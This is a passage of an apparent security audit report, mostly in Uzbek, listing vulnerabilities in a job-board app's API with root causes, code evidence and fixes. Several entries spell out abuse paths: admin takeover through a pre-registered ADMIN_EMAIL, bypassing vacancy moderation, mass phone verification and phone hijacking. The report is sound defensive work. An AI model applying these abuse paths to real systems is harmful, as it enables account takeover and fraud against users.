- **Severity izohi:** P1 saqlandi: I qoidasi aniq taqiqlaydi. ISSUE-011 fix'i (D-007) shu lockout'ni kiritgan va xavfni ochiq qoldirgan; bu XFF spoofing'dan alohida root cause.
- **Manba topilmalar:** auth-core-3, headers-infra-4
- **Bajarilgan fix:** auth-core-3: FIXED — Lockout is keyed by email|ip (10/15 min); one source can only lock itself out. | headers-infra-4: FIXED — The email-only ceiling is now 50/15 min, unreachable from a single source, so a victim cannot be locked out on demand.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-166

**ensureAdminUser har ishga tushishda ADMIN_EMAIL bilan mavjud istalgan hisobni adminga ko'taradi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** auth/privilege-escalation
- **Fayl:** `apps/api/src/common/ensure-admin.ts:25`
- **Root cause:** Bootstrap har boot'da ADMIN_EMAIL bo'yicha foydalanuvchini topib, roli admin bo'lmasa role=admin qiladi. Hisobni kim yaratgani, email tasdiqi va blok holati tekshirilmaydi. Ochiq ro'yxatdan o'tish istalgan emailni tasdiqsiz qabul qiladi. ADMIN_PASSWORD yo'q yoki qisqa bo'lsa admin yaratilmaydi va email bo'sh qoladi.
- **Impact:** Operator ADMIN_EMAIL (ko'pincha taxmin qilinadigan, masalan admin@domen) ni qo'yishidan oldin yoki izohdagi 'bazadan o'chirib qayta ishga tushiring' paytida shu emailni ro'yxatdan o'tkazgan kishi keyingi deploy'da o'z paroli bilan to'liq admin bo'ladi: barcha nomzod ma'lumotlari, moderatsiya, rol berish. Paneldan pasaytirilgan hisob ham har restartda qayta admin bo'ladi.
- **Evidence:** ensure-admin.ts:23-29 `if (existing) { if (existing.role !== "admin") await prisma.user.update(... role: "admin") }`; :12-14 'hisobni bazadan o'chiring'; :32-38; server.ts:267-271; auth.service.ts:37-60; .env.example:57; DEPLOY.md:64, 210.
- **Recommended fix:** Adminni faqat email bo'sh bo'lganda yarating. Mavjud admin bo'lmagan hisob uchun faqat ogohlantirish yozing va hech narsa qilmang. Ongli ko'tarishni bir martalik CLI skript orqali audit event bilan bajaring. 'Bazadan o'chiring' maslahatini qo'lda tiklash oqimiga almashtiring.
- **Severity izohi:** P1 saqlandi (3 manba). Hujumchi birinchi ro'yxatdan o'tishi kerak, lekin natija to'liq admin huquqi. ISSUE-096 faqat ADMIN_PASSWORD uzunligi haqida.
- **Manba topilmalar:** auth-core-5, headers-infra-3, admin-staff-3
- **Bajarilgan fix:** auth-core-5: FIXED — D-069: ensureAdminUser never promotes; an existing ADMIN_EMAIL account only logs a warning. Verified against the e2e second-server check (role must stay job_seeker). | headers-infra-3: FIXED — Same single fix in common/ensure-admin.ts; the bootstrap only creates a missing account. | admin-staff-3: FIXED — Same fix; the role is now granted only through the admin panel (PATCH /api/admin/users/:id/role).
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-167

**Hujjatlashtirilgan deploy'da refresh cookie third-party (vercel.app va up.railway.app): Safari/iOS va Brave uni bloklaydi, sessiya 15 daqiqada tugaydi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** auth/session-cookie
- **Fayl:** `apps/api/src/modules/auth/auth.routes.ts:43`
- **Root cause:** Sessiya cross-site SameSite=None refresh cookie'ga tayanadi, uni boshqa origin'dagi web credentials: include bilan o'qiydi. DEPLOY/README saytni *.vercel.app, API ni *.up.railway.app da joylashtiradi. Ikkalasi Public Suffix List'da, shuning uchun cookie third-party hisoblanadi.
- **Impact:** Safari ITP (13.1 dan beri, iOS'dagi barcha WebKit brauzerlar), Brave va third-party cookie o'chiq brauzerlar cookie'ni saqlamaydi va yubormaydi. Login'dan keyin localStorage'dagi 15 daqiqalik token ishlaydi, keyin refresh accessToken:null qaytaradi va foydalanuvchi mehmonga tushadi. Bunday brauzerlarda logout server sessiyasini ham bekor qila olmaydi. WebKit'da sinovdan o'tkazilmagan: hujjatlashtirilgan brauzer xatti-harakatidan xulosa.
- **Evidence:** auth.routes.ts:30-46 (izoh: sayt va API har xil domenda), :43 sameSite none; session.ts:118-125 fetch refresh credentials include; jwt.ts:36 15m; DEPLOY.md:63 WEB_ORIGIN https://ishbor.vercel.app, :189; apps/web/.env.example VITE_API_URL up.railway.app; e2e faqat SameSite=None ni tekshiradi.
- **Recommended fix:** Cookie'ni first-party qiling. Afzal yo'l: /api/* (kamida /api/auth/*) ni web origin orqali proxy qiling (Vercel rewrite va server/index.mjs) va SameSite=Lax. Muqobil: API ni api.<sayt-domeni> da joylashtiring (Safari CNAME uchun cheklov qo'yishi mumkin). DEPLOY.md ni yangilang va WebKit Playwright'da login -> 15 daqiqadan keyin refresh tekshiruvini qo'shing.
- **Severity izohi:** P1 saqlandi: mobil foydalanuvchilarning katta qismi uchun asosiy funksional muammo. Ishonch: brauzer xatti-harakati hujjatlashtirilgan, deploy'da sinalmagan. ISSUE-097 faqat CSRF tomoni.
- **Manba topilmalar:** auth-core-8, headers-infra-5
- **Bajarilgan fix:** auth-core-8: FIXED — Per D-076 the fix is deployment-level: DEPLOY.md now requires web and API under one registrable domain and explains the WebKit/Brave failure mode. No cookie/proxy code change was m | headers-infra-5: FIXED — Same D-076 documentation; SameSite=None behaviour left untouched deliberately.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-168

**Telegram mavjud emasligi modellashtirilmagan: telefon to'sig'i botga qattiq bog'liq, token ixtiyoriy, bot holati bir marta o'rnatiladi (K qoidasi)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** config/availability
- **Fayl:** `apps/api/src/common/auth-guard.ts:97`
- **Root cause:** requirePhoneVerified shartsiz, isPhoneVerified=true ni esa faqat bot kontakt handler'i yozadi. env.ts TELEGRAM_BOT_TOKEN ni production tekshiruvisiz ixtiyoriy qiladi, README Telegram'siz 'to'liq ishlaydi' deydi. Ishga tushgach botUsername getMe'dan keyin bir marta o'rnatiladi va getUpdates xatolarida (401/409/tarmoq) tozalanmaydi. UI esa xom o'zbekcha server xabarini ko'rsatadi.
- **Impact:** Token yo'q, bekor qilingan yoki Telegram uzoq ishlamasa, har bir tasdiqlanmagan foydalanuvchi ariza, vakansiya, chat va sharhdan to'siladi, UI esa buni faqat bosganda ko'rsatadi. Polling ishlamay qolsa sayt baribir deep-link beradi, foydalanuvchi javobsiz kutadi; ru/en foydalanuvchilar o'zbekcha matn ko'radi. K qoidasi qisman bajarilgan.
- **Evidence:** auth-guard.ts:90-103; `isPhoneVerified: true` faqat telegram.service.ts:342 da; env.ts:57 TELEGRAM_BOT_TOKEN default ""; README.md:130-137; telegram.service.ts:436 botUsername bir marta, :448-450 `if (!updates) { await pause(5000); continue; }`; telegram.routes.ts:20, 26-32; TelegramConnect.tsx:85 err.message.
- **Recommended fix:** Production'da token bo'sh bo'lsa boot'da fail qiling yoki baland ogohlantiring va Telegramni majburiy deb hujjatlashtiring. lastPollOkAt va ketma-ket xatolarni kuzating: takroriy xato yoki 401/409 da botni offline deb belgilang, 401 da siklni to'xtating. Link, tasdiq va recovery endpointlari 503 TELEGRAM_UNAVAILABLE qaytarsin. /api/telegram/status da availability bayrog'ini bering, UI 3 tilda 'vaqtincha mavjud emas' deb ko'rsatib amallarni o'chirsin. Email fallback qo'shmang.
- **Severity izohi:** P1 (telegram-9 P2 bilan birlashtirildi): K qoidasi va asosiy oqimlarning to'liq to'silishi. ISSUE-079 faqat getMe retry va shutdown'ni tuzatgan, ISSUE-087 gate joylashuvi haqida.
- **Manba topilmalar:** telegram-8, telegram-9
- **Bajarilgan fix:** telegram-8: FIXED — Missing bot token in production logs a startup warning (D-072) and the phone gate answers 503 TELEGRAM_UNAVAILABLE instead of an impossible instruction. README/DEPLOY wording belon | telegram-9: FIXED — isTelegramAvailable() = token + known username + successful getUpdates within 90 s; 401/409 stops the loop and clears the username; failure logs are throttled; link/recovery endpoi
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-169

**Tasdiqlangan telefon yagona emas va qayta bog'lashda saqlanib qoladi: bitta Telegram/SIM cheksiz hisobni tasdiqlaydi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** telegram/phone-verification
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:339`
- **Root cause:** handleContact telefon boshqa hisobda tasdiqlanganmi, tekshirmasdan phone va isPhoneVerified=true yozadi. User.phone da unique indeks yo'q. Qayta bog'lash eski hisobdan faqat telegramChatId ni tozalaydi, DELETE /api/telegram/link esa tasdiqni saqlab qoladi.
- **Impact:** E va F qoidalari buziladi. link(A)->ulashish->link(B)->ulashish orqali bitta telefondan istalgancha tasdiqlangan hisob yaratiladi. Bu ariza, vakansiya, chat va sharhlar oldidagi anti-spam to'siqni (requirePhoneVerified) yo'q qiladi va o'z vakansiyasiga soxta ariza/sharh qilishga imkon beradi. Bir xil telefon ko'p hisobda bo'lsa, kelajakdagi telefon orqali tiklash noaniq bo'lib qoladi.
- **Evidence:** schema.prisma:163 `phone String?` (@unique yo'q), :172-176 izoh; telegram.service.ts:269-273, 339-343; telegram.routes.ts:38-44; auth-guard.ts:90-103 faqat boolean; profile.routes.ts:65-67 tasdiqlanmagan telefon erkin matn sifatida yoziladi.
- **Recommended fix:** Telefonni E.164 ga normallashtiring va tasdiqlangan telefonlar uchun yagonalikni ta'minlang (masalan PhoneBinding {phoneE164 @unique, userId} kolleksiyasi, shunda null to'qnashmaydi). handleContact boshqa hisobda tasdiqlangan raqamni umumiy javob bilan rad etib, qo'lda tiklashga yo'naltirsin. Qayta bog'lash va uzishda eski hisob tasdiqini bekor qiling. Mavjud dublikatlar uchun avval tozalash hisoboti tayyorlang.
- **Severity izohi:** P1 saqlandi: E/F mahsulot qoidasi va anti-spam nazorati buziladi. ISSUE-087 faqat to'siq qaysi route'larda turishi haqida.
- **Manba topilmalar:** telegram-3, authz-idor-3
- **Bajarilgan fix:** telegram-3: FIXED — phoneOwner() rejects a number already verified as primary or held as a backup on another account, at verification time. | authz-idor-3: FIXED — Verification is per challenge and per purpose; an unlinked account keeps its verified number, so nobody else can re-verify it.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-170

**Admin 'arxivlash' bilan olib tashlangan vakansiyani ish beruvchi darhol qayta faollashtira oladi (moderatsiyani chetlab o'tish)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** authz/moderation
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:240`
- **Root cause:** Admin moderatsiya amali ham, egasining o'zi yopishi ham status=archived yozadi va kim arxivlagani belgilanmaydi. Egasi uchun o'tish jadvali archived -> active ga ruxsat beradi.
- **Impact:** Admin firibgar vakansiyani panelda arxivlasa, ish beruvchi PATCH /api/vacancies/:id/status {status:'active'} bilan uni darhol qayta e'lon qiladi (UI arxivlangan qatorda 'Faollashtirish' tugmasini ko'rsatadi) va vakansiya qayta indekslanadi. Rad etilgan kontent yangi vakansiya sifatida ham darhol qayta joylanadi, chunki yaratish sukut bo'yicha active.
- **Evidence:** vacancies.routes.ts:240 `allowedFrom = { active: ["archived", "draft"], archived: ["active"] }`; admin.routes.ts:289, 301-309 archived hech qanday qulfsiz; web admin/vacancies/+Page.tsx:185-188 archive tugmasi; lib/employer/vacancies/adapter.ts:101 `activate: v.status === "archived" || ...`; vacancies.service.ts:646 `input.status ?? "active"`.
- **Recommended fix:** Moderator takedown'ini belgilang (moderationLockedAt/By) yoki admin arxivini sabab bilan 'rejected' ga moslang. Qulflangan vakansiyani egasi qayta faollashtirishi va qayta yuborishini admin tasdiqlaguncha to'sing. Ixtiyoriy: yaqinda rad etilgan kompaniyalarning yangi e'lonlarini oldindan moderatsiya qiling.
- **Severity izohi:** P1 saqlandi: 'moderatsiyani chetlab o'tish imkonsiz bo'lishi kerak' qoidasi. D-015/ISSUE-024 archived->active ni faqat egasi yopgan holat uchun belgilagan.
- **Manba topilmalar:** authz-idor-4
- **Bajarilgan fix:** authz-idor-4: FIXED — PATCH /api/vacancies/:id/status calls assertNotAdminLocked before the phone gate; adminArchivedAt is set by admin archive/reject/block/role change and cleared only by admin activat
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-171

**Kompaniya nomi, logo yoki sayti o'zgarsa ham admin bergan 'tasdiqlangan' belgisi saqlanib qoladi**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** authz/moderation-trust
- **Fayl:** `apps/api/src/modules/companies/companies.routes.ts:108`
- **Root cause:** PUT /api/employer/company va logo yuklash identifikatsiya maydonlarini yangilaydi, lekin isVerified ni tiklamaydi va qayta ko'rib chiqishni talab qilmaydi. Tasdiq tasdiqlangan identifikatsiyaga bog'lanmagan bir martalik boolean.
- **Impact:** Tasdiqlangan ish beruvchi (yoki uning hisobini egallagan kishi) kompaniyani taniqli brend nomiga o'zgartirib, logo va saytni almashtiradi. Belgi va verified=1 filtri saqlanadi, nomzodlar firibgar vakansiyalarga ishonib shaxsiy ma'lumot beradi.
- **Evidence:** companies.routes.ts:107-120 update name/description/website/..., isVerified tegilmaydi; :158-160 logo faqat logoUrl; admin.routes.ts:374-381 verify; vacancies.service.ts:49 public kartada isVerified, :179 verified filtri.
- **Recommended fix:** Tasdiqlangan kompaniyada nom, yuridik nom, STIR, sayt yoki logo o'zgarsa isVerified ni tiklang (yoki kutilayotgan qayta tasdiq holati). Muqobil: tasdiqlangan snapshot saqlab, belgini faqat moslik bo'lganda ko'rsating. Adminlarni xabardor qiling va audit event yozing.
- **Severity izohi:** P1 saqlandi: admin tasdig'i moderatsiya qarori, uni chetlab o'tish mahsulot qoidasini buzadi. Oldin tasdiqlangan kompaniya yoki hisob egallash talab qilinadi.
- **Manba topilmalar:** authz-idor-5
- **Bajarilgan fix:** authz-idor-5: FIXED — PUT /api/employer/company and both logo routes set isVerified:false when a verified company's name, website or logo changes, and the owner is notified (company.verificationRemoved)
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-172

**Telefon almashtirish jim qayta yozish: qayta autentifikatsiya, xabarnoma, audit va sessiya bekor qilish yo'q**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** telegram/phone-change
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:340`
- **Root cause:** Bog'langan chatdan kelgan har qanday kontakt User.phone ni oldingi qiymatga qaramasdan qayta yozadi. Telegram hisobini almashtirish uchun faqat access token kerak (POST link yoki DELETE+POST). Parol qayta so'ralmaydi, eski chatga xabar yuborilmaydi, tokenVersion oshmaydi, event yozilmaydi.
- **Impact:** G qoidasi buziladi. O'g'irlangan qisqa muddatli access token bilan hujumchi hisobning tasdiqlangan telefoni va Telegramini doimiy ravishda o'zinikiga almashtiradi, egasi bundan bexabar qoladi. Telegram tiklash kanali qurilgach, bu doimiy hisob egallashga aylanadi.
- **Evidence:** telegram.service.ts:323-350 `update({ phone, isPhoneVerified: true })`; telegram.routes.ts:25-35 (faqat requireAuth), :38-44; telegram modulida revokeUserSessions chaqiruvi yo'q; profile.routes.ts:65 faqat sayt tomonidagi tahrirni to'sadi.
- **Recommended fix:** Alohida telefon almashtirish oqimi: yaqinda parolni qayta kiritish, yangi raqamni bir martalik payload bilan Telegram orqali tasdiqlash, eski chat/raqamga xabarnoma, PHONE_CHANGED audit event'i, risk modeliga ko'ra tokenVersion++. Yangi raqam tiklash uchun ishlatilishidan oldin kutish muddati qo'ying.
- **Severity izohi:** P1 saqlandi: G qoidasini to'g'ridan-to'g'ri buzadi va tiklash oqimi uchun xavfli asos yaratadi.
- **Manba topilmalar:** telegram-4
- **Bajarilgan fix:** telegram-4: FIXED — Phone change needs the current password, runs through a dedicated challenge, invalidates all sessions, writes phone_changed + sessions_invalidated and tells the user in Telegram th
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-173

**Qo'lda hisob tiklash so'rovi va admin tomonidan tasdiqlangan telefon reset'i yo'q (H qoidasi)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** admin/recovery
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:190`
- **Root cause:** ManualRecoveryRequest modeli, foydalanuvchi formasi, admin navbati va telefon/Telegramni reset qiladigan admin amali yo'q. Admin API faqat foydalanuvchilar ro'yxati, blok va rolni qo'llaydi. Support formasida tiklash mavzusi yo'q va xabarlar saqlanmaydi (faqat Telegram admin chatiga ketadi). Bot relay esa H holatidagi foydalanuvchi yo'qotgan Telegramni talab qiladi.
- **Impact:** Parol, telefon va Telegramni yo'qotgan foydalanuvchi uchun hech qanday yo'l yo'q. Adminlar egalikni tekshirmasdan, sessiyalarni majburan bekor qilmasdan va audit'siz bazani qo'lda tahrirlashga majbur bo'ladi.
- **Evidence:** admin.routes.ts:136 (users), :190-215 (block), :217-226 (role), boshqa user mutatsiyasi yo'q; support.routes.ts:121-145 xabar faqat Telegramga yuboriladi; admin/users/+Page.tsx:45-58 faqat block/role amallari; AccountSettings.tsx:88 -> /support.
- **Recommended fix:** POST /api/support ga 'account_recovery' mavzusi va AccountRecoveryRequest (status, aloqa emaili, da'vo qilingan telefonning hash'i yoki oxirgi raqamlari, reviewer, izohlar; sirlarsiz). /admin/users da tiklash filtri va overview'da kutilayotganlar hisoblagichi. Approve (status=pending sharti bilan bir martalik): phone, isPhoneVerified, telegramChatId ni tozalash, revokeUserSessions + closeUserSockets, audit, foydalanuvchiga xabarnoma. Admin parol yoki tokenni hech qachon ko'rmaydi va o'rnatmaydi.
- **Severity izohi:** P1 saqlandi: H qoidasi to'liq bajarilmagan. ISSUE-012 o'z-o'ziga xizmat qiluvchi reset haqida; qo'lda tiklash yangi talab.
- **Manba topilmalar:** telegram-6, admin-staff-2
- **Bajarilgan fix:** telegram-6: FIXED — Manual recovery implemented end to end: request -> admin approve/reject -> continue -> Telegram verification -> reset link. | admin-staff-2: FIXED — Approve clears phone/isPhoneVerified/telegramChatId/backup fields, bumps tokenVersion, closes sockets and opens a 72 h continue window; the admin never sees a password, token or re
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-174

**Security audit log yo'q: rol, blok, sessiya bekor qilish, Telegram bog'lash/uzish, telefon tasdiqi va moderatsiya iz qoldirmaydi (L qoidasi)**

- **Severity:** P1
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** security/audit-log
- **Fayl:** `apps/api/prisma/schema.prisma:160`
- **Root cause:** Sxemada audit yoki security-event modeli yo'q va hech bir sezgir handler yozuv qoldirmaydi: admin block/role, moderate, company verify, review status/delete, payment confirm, broadcast, team PATCH, Telegram link/relink/unlink, telefon tasdiqi, logout revocation. Yagona iz: logout xatosida pino warn va broadcast'dagi delivered soni.
- **Impact:** L qoidasidagi birorta ham event yozilmaydi. Kompromat qilingan adminning suiiste'moli (admin berish, adminlarni bloklash, sharh o'chirish) va Telegram orqali egallash tekshirib bo'lmaydi, foydalanuvchiga ham ko'rsatib bo'lmaydi. Qo'lda tiklash (H) uchun egalik tarixi yo'q.
- **Evidence:** schema.prisma:160-805 modellar ro'yxati (audit modeli yo'q); admin.routes.ts:190-226, 285-325, 374-394, 502-521, 534-591; team.routes.ts:168-216; telegram.service.ts:269-273, 340-343; telegram.routes.ts:38-44; auth.routes.ts:102-127.
- **Recommended fix:** Append-only SecurityEvent {userId, actorUserId?, type enum (PHONE_VERIFIED, BACKUP_PHONE_ADDED, PHONE_CHANGED, RECOVERY_STARTED/COMPLETED, SESSIONS_REVOKED, MANUAL_RECOVERY_APPROVED, TELEGRAM_LINKED/UNLINKED, ROLE_CHANGED, BLOCKED, ...), ipHash, userAgent, allowlist meta (niqoblangan telefon), createdAt}, indekslar [userId, createdAt] va [type, createdAt], retention TTL. Token, parol va xabar matnini rad etuvchi recordSecurityEvent() helper'i, admin uchun faqat o'qish ko'rinishi.
- **Severity izohi:** P1 (authz-idor-9 P2 bergan): L qoidasi aniq mahsulot talabi va H qoidasi audit'siz amalga oshirib bo'lmaydi.
- **Manba topilmalar:** auth-core-7, telegram-7, authz-idor-9, admin-staff-1
- **Bajarilgan fix:** auth-core-7: FIXED — Admin block/unblock/role changes (admin.routes.ts and team.routes.ts) now write events together with sessions_invalidated. | telegram-7: FIXED — SecurityEvent model + recordSecurityEvent; all 16 contract event types are written by the phone, Telegram, recovery and admin flows. | authz-idor-9: PARTIAL — Authorization-sensitive actions (role, block, phone/Telegram identity, recovery) are all logged; company verification and vacancy moderation are outside this group's owned lines. | admin-staff-1: FIXED — Same; admin reads a user's last 50 events via GET /api/admin/users/:id/security-events.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-175

**API katta JSON va XML javoblarini siqishsiz beradi (compression plugin yo'q)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** WONT FIX
- **Area:** scale/transport
- **Fayl:** `apps/api/src/server.ts:60`
- **Root cause:** Fastify helmet, cors, cookie, rate-limit, multipart, websocket registratsiya qiladi, lekin @fastify/compress yo'q va package.json'da siqish dependency'si yo'q. Brauzer API origin'ini to'g'ridan-to'g'ri chaqiradi; Railway edge siqishi tasdiqlanmagan (inference).
- **Impact:** 2.6 MB arizalar, 987 KB vakansiyalar, 498 KB suhbatlar, 113 KB kompaniya sahifasi va 7.2 MB sitemap mobil foydalanuvchiga to'liq hajmda boradi — kechikish va trafik so'rov narxi ustiga qo'shiladi.
- **Evidence:** server.ts:60-140 plugin ro'yxati; grep 'compress' apps/api/package.json va server.ts — natija yo'q. FINAL_AUDIT.md 10K jadvali hajm ustuni.
- **Recommended fix:** @fastify/compress (brotli/gzip, threshold ~1 KB, WS upgrade va /uploads statik fayllarni chiqarib) registratsiya qiling yoki Railway edge siqishini tasdiqlab DEPLOY.md'ga yozing. Sahifalashni almashtirmaydi, to'ldiradi.
- **Severity izohi:** P2 (performance), medium confidence: edge siqish tekshirilmagan.
- **Manba topilmalar:** db-perf-9
- **Bajarilgan fix:** db-perf-9: WONT FIX — @fastify/compress is not an API dependency and no new dependencies are allowed in this round. Compression must be done at the Railway edge/CDN - recorded in needsOutside as an owne
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-176

**O'xshash vakansiyalar (har detail SSR'da) faqat [categoryId] indeksiga tayanadi: kategoriyadagi barcha vakansiyalar xotirada sort qilinadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** scale/search
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:592`
- **Root cause:** So'rov {status:'active', id!=base, categoryId} bo'yicha, orderBy publishedAt desc, id desc, take 40. categoryId bor yagona indeks [categoryId], shuning uchun MongoDB kategoriyadagi har statusdagi barcha hujjatlarni o'qib top-k sort qiladi. companyId fallback'i ham [companyId,status] bilan xotirada sort.
- **Impact:** Har vakansiya detail SSR'i (eng ko'p crawl qilinadigan sahifa) /similar'ni chaqiradi; bitta kategoriyada minglab hujjat bo'lishi mumkin va har ko'rish va crawler hit'ida o'qiladi (inference; /similar benchmark'da yo'q, detail 9 ms).
- **Evidence:** vacancies.service.ts:592-598 findMany where status/id not/categoryId, orderBy publishedAt,id, take 40; :610-615 companyId fallback. schema.prisma:445 @@index([categoryId]); :444 [companyId, status]. web pages/vacancies/@slug/+data.ts:13-22; lib/api.ts:390.
- **Recommended fix:** @@index([categoryId, status, publishedAt]) va [companyId, status, publishedAt] qo'shing (explain bilan tekshiring). Natijani slug bo'yicha 5-10 daqiqa TTL bilan keshlang.
- **Severity izohi:** P2 (performance), medium confidence: explain qilinmagan.
- **Manba topilmalar:** scale-10k-11
- **Bajarilgan fix:** scale-10k-11: FIXED — New @@index([categoryId, status, publishedAt, id]) (and the company fallback index) matches the similar-vacancies filter and sort, and the result is cached per slug+limit for 5 min
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-177

**Telegram bot o'chiq holati oldindan ko'rsatilmaydi: botUsername=null UI'da o'qilmaydi, 503 xom o'zbekcha matni bosgandan keyin chiqadi, telefon darvozasi baribir Telegram talab qiladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Area:** telegram/ux-errors
- **Fayl:** `apps/web/src/components/TelegramConnect.tsx:85`
- **Root cause:** GET /api/telegram/status botUsername'ni qaytaradi (getMe muvaffaqiyatli bo'lguncha null), lekin web uni o'qimaydi. TelegramConnect doim Connect tugmasini ko'rsatadi va 503 BOT_OFFLINE'dagi err.message'ni chiqaradi. requirePhoneVerified bot holatidan qat'i nazar 'Telegram orqali tasdiqlang' deb 403 beradi.
- **Impact:** Rule K qisman buziladi: bot o'chiqligida profil ishlaydigandek tugma ko'rsatadi; ru/en foydalanuvchi bosgandan keyin o'zbekcha server matnini ko'radi. Ariza, vakansiya va suhbat ochish 'Telegram orqali tasdiqlang' deb bajarib bo'lmaydigan ko'rsatma bilan bloklaydi. Hech narsa yiqilmaydi.
- **Evidence:** telegram.routes.ts:11-21 botUsername: getBotUsername(); :25-32 503 BOT_OFFLINE. web: botUsername faqat lib/types.ts:378 da. TelegramConnect.tsx:85 `setError(err instanceof ApiError ? err.message : ...)`. auth-guard.ts:97-102 PHONE_NOT_VERIFIED matni.
- **Recommended fix:** Status javobiga aniq available bayrog'i qo'shing. TelegramConnect'da bot o'chiq bo'lsa tugmani o'chirib tarjima qilingan 'Telegram tasdiqlash vaqtincha mavjud emas' xabarini ko'rsating. BOT_OFFLINE kodini i18n'ga map qiling. Bot o'chiqligida darvoza alohida TELEGRAM_UNAVAILABLE kodi qaytarsin yoki UI mavjudlikni tekshirsin. Email fallback qo'shilmasin.
- **Severity izohi:** P2 saqlandi: 503 matni uz uchun 'keyinroq urinib ko'ring' deydi va crash yo'q, shuning uchun rule K to'liq emas, qisman buzilgan. ISSUE-073 (xom matn) bog'liq.
- **Manba topilmalar:** api-errors-3
- **Bajarilgan fix:** api-errors-3: FIXED — Web side done: TelegramConnect reads status.available, disables Connect and shows the translated Rule K notice proactively (card, panel and compact), and maps TELEGRAM_UNAVAILABLE/
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-178

**Chat xabari Telegram alertlari bildirishnoma sozlamalarini chetlab o'tadi va chat uchun yagona tashqi kanal**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Area:** notifications
- **Fayl:** `apps/api/src/modules/chat/chat.routes.ts:84`
- **Root cause:** deliverMessage notify() o'rniga notifyUserViaTelegram'ni to'g'ridan-to'g'ri chaqiradi. NotificationType'da xabar turi yo'q, shuning uchun sozlama boshqara olmaydi. Push, email va in-app chat uchun ishlatilmaydi. 'Oflayn' — umuman socket yo'q, ya'ni fon tabdagi bell socketi ham alertni o'chiradi. Matn qat'iy o'zbekcha va xabarning 200 belgisini o'z ichiga oladi.
- **Impact:** Foydalanuvchi chat Telegram alertlarini faqat Telegram'ni uzib o'chira oladi; rule B/F bo'yicha Telegram tiklash kanali bo'lgani uchun uni uzishga undaladi. Telegram'siz yoki biror tab ochiq qolgan foydalanuvchi yangi xabar haqida xabar olmaydi. RU/EN foydalanuvchi o'zbekcha matn oladi.
- **Evidence:** chat.routes.ts:84-89 notifyUserViaTelegram, `💬 Yangi xabar keldi` + body.slice(0,200). schema.prisma:119-124 enum NotificationType {new_application, application_status_changed, new_vacancy_match, system}. realtime.ts:45-47 isOnline = sockets.has(userId).
- **Recommended fix:** 'new_message' NotificationType qo'shing va notify() orqali telegram/push kanallarida (in_app emas) har suhbat debounce bilan yuboring; sozlamalar matritsasida ko'rsating. 'Online'ni ko'rinadigan tab yoki chat faolligi bo'yicha aniqlang. Matnni lokalizatsiya qiling.
- **Severity izohi:** P2 saqlandi; ISSUE-060 faqat status izohini deliverMessage'ga yo'naltirgan.
- **Manba topilmalar:** realtime-4
- **Bajarilgan fix:** realtime-4: PARTIAL — The alert now respects preferences (closest existing pair: type `system`, channel `telegram`, documented in the code), is throttled, is skipped when the bot is unconfigured, and no
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### ISSUE-179

**notify() sozlanmagan Telegram va email kanallarini ham ishlatadi; SMTP yo'q bo'lsa har bildirishnomada email manzili logga yoziladi**

- **Severity:** P2
